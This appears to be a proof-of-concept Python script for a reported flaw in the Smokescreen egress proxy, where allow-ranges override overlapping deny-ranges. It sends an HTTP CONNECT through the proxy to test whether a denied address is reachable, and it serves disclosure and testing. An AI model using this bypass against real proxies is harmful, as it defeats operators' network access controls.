#!/usr/bin/env python3
"""
POC: Smokescreen ACL Range Logic Bypass
========================================

VULNERABILITY: --allow-ranges/--deny-address combination logic flaw
SEVERITY: CRITICAL
ISSUE: #236 - https://github.com/stripe/smokescreen/issues/236

DESCRIPTION:
The classifyAddr() function checks allow-ranges BEFORE deny-ranges.
When an IP matches both ranges, ALLOW takes precedence.
This allows bypassing deny rules via overlapping CIDR ranges.

AFFECTED CODE:
  pkg/smokescreen/smokescreen.go lines 316-319

EXPLOIT:
  Config: --deny-range 1.0.0.0/8 --allow-range 1.1.0.0/16
  Target: 1.1.1.1 (matches both ranges)
  Result: ALLOWED (should be DENIED)
"""

import socket
import ssl
import sys
from typing import Tuple

class RangeBypassPOC:
    def __init__(self, host: str, port: int, cert_file: str, key_file: str):
        self.host = host
        self.port = port
        self.cert_file = cert_file
        self.key_file = key_file
    
    def test_connect(self, target_host: str, target_port: int) -> Tuple[bool, str]:
        """Test if proxy allows CONNECT to target"""
        try:
            context = ssl.create_default_context()
            context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.host, self.port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                    connect_request = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\n"
                    connect_request += f"Host: {target_host}:{target_port}\r\n"
                    connect_request += "Connection: close\r\n\r\n"
                    
                    ssock.sendall(connect_request.encode())
                    response = ssock.recv(4096).decode('utf-8', errors='ignore')
                    
                    if "200" in response.split('\n')[0]:
                        return True, "✓ ALLOWED"
                    else:
                        return False, "✗ DENIED"
        except Exception as e:
            return False, f"✗ ERROR: {str(e)}"
    
    def run(self):
        print("\n" + "="*70)
        print("POC1: ACL RANGE BYPASS (CRITICAL)")
        print("="*70)
        
        print("\nVULNERABLE CONFIG:")
        print("  --deny-range 1.0.0.0/8")
        print("  --allow-range 1.1.0.0/16")
        
        print("\n[TEST] Connect to 1.1.1.1:443")
        print("Expected (correct): DENIED (1.0.0.0/8 deny takes precedence)")
        print("Actual (vulnerable): ALLOWED (allow checked first)")
        
        success, msg = self.test_connect("1.1.1.1", 443)
        print(f"Result: {msg}")
        
        if success:
            print("\n⚠ VULNERABILITY CONFIRMED: Overlapping ranges allow bypass!")
            return True
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("USAGE: python3 poc1_allow_deny_range_bypass.py <proxy_host> [port] [cert] [key]")
        print("EXAMPLE: python3 poc1_allow_deny_range_bypass.py localhost 4750 client.pem client-key.pem")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4750
    cert = sys.argv[3] if len(sys.argv) > 3 else "client.pem"
    key = sys.argv[4] if len(sys.argv) > 4 else "client-key.pem"
    
    poc = RangeBypassPOC(host, port, cert, key)
    poc.run()
